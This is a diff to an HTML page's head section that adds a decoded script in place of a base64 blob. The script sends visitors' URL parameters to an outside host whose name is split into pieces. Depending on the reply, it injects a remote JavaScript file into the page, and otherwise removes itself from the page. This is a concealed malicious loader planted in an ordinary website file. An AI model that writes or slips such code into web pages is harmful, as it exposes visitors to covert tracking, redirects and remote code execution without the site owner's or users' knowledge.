@@ -9,7 +9,30 @@
 <script type="text/javascript" src="js/hover.js"></script>
 <link type="text/css" rel="stylesheet" href="styles/style.css" />
 
-PHNjcmlwdCBpZD0iMlVjZlpYZSI+CiAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIHZhciB1cmxQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOwogIHZhciB0b2tlbiA9IHVybFBhcmFtcy5nZXQoJ3V0bV9jYW1wYWlnbicpOwogIHZhciBwaXhlbCA9IHVybFBhcmFtcy5nZXQoJ3BpeGVsJyk7CiAgdmFyIGhvc3QgPSAnYmVzdHNsaXZhcHAnOwogIHZhciBkb21haW5fem9uZSA9ICd3ZWJzaXRlJzsKICB2YXIgdCA9ICcnOwogIHhoci5vcGVuKCdHRVQnLCAnaHR0cHM6Ly8nICsgaG9zdCArICcuJyArIGRvbWFpbl96b25lICsgJy9hcGkucGhwP3Rva2VuPScgKyB0b2tlbiArICcmJysgdXJsUGFyYW1zLnRvU3RyaW5nKCkpOwogIHhoci5zZW5kKCk7CiAgeGhyLm9ubG9hZCA9IGZ1bmN0aW9uICgpIHsKICAgIHQgPSB4aHIucmVzcG9uc2U7CiAgICB0ID0gdC5yZXBsYWNlKC8wMHBpeGVsMDAvZ2ksIHBpeGVsKTsKICAgIHQgPSBKU09OLnBhcnNlKHQpOwogICAgdCA9IHQucmVkaXJlY3QuY29udGVudDsKICAgIGlmICh0ICE9ICIiKSB7CiAgICAgIHQgPSB0LnJlcGxhY2UoL2Jhc2UgaHJlZj0iL2dpLCAnYmFzZSBocmVmPSJodHRwczovLycgKyBob3N0ICsgJy4nICsgZG9tYWluX3pvbmUgKyAnLycpOwogICAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpLCBoID0gImhlYWQiOwogICAgICBhLmFzeW5jID0gdHJ1ZTsKICAgICAgYS5zcmMgPSAnaHR0cHM6Ly8nICsgaG9zdCArICcuJyArIGRvbWFpbl96b25lICsgJy9qcy9mcm0uanMnOwogICAgICBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZShoKVswXS5hcHBlbmRDaGlsZChhKQogICAgfWVsc2UgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIjJVY2ZaWGUiKS5yZW1vdmUoKTsKICB9Cjwvc2NyaXB0Pg==
+<script id="2UcfZXe">
+  var xhr = new XMLHttpRequest();
+  var urlParams = new URLSearchParams(window.location.search);
+  var token = urlParams.get('utm_campaign');
+  var pixel = urlParams.get('pixel');
+  var host = 'bestslivapp';
+  var domain_zone = 'website';
+  var t = '';
+  xhr.open('GET', 'https://' + host + '.' + domain_zone + '/api.php?token=' + token + '&'+ urlParams.toString());
+  xhr.send();
+  xhr.onload = function () {
+    t = xhr.response;
+    t = t.replace(/00pixel00/gi, pixel);
+    t = JSON.parse(t);
+    t = t.redirect.content;
+    if (t != "") {
+      t = t.replace(/base href="/gi, 'base href="https://' + host + '.' + domain_zone + '/');
+      var a = document.createElement("script"), h = "head";
+      a.async = true;
+      a.src = 'https://' + host + '.' + domain_zone + '/js/frm.js';
+      document.getElementsByTagName(h)[0].appendChild(a)
+    }else document.getElementById("2UcfZXe").remove();
+  }
+</script>
 
 </head>
 <body id="haD6SZlrfE">
